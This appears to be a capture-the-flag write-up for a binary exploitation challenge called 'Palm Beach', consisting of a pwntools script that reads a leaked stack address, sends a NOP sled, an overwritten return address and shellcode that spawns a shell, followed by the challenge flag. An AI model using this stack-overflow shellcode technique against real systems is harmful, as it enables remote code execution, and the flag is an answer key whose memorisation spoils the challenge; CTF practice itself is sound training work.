# Palm Beach

Solved by: @CapangJabba

## Question:
Get your tan on


## Solution:
```
io.recvuntil(b'Speed limit: ')
stack = int(io.recv().strip(),16)


info(f'stack address: {hex(stack)}')


payload = b'\x90'*168+ p64(stack+176) + asm(shellcraft.sh())

io.sendline(payload)
io.interactive()
```

**Flag:** `sun{I should probably wash my window, that polar bear looks like a duck.}`
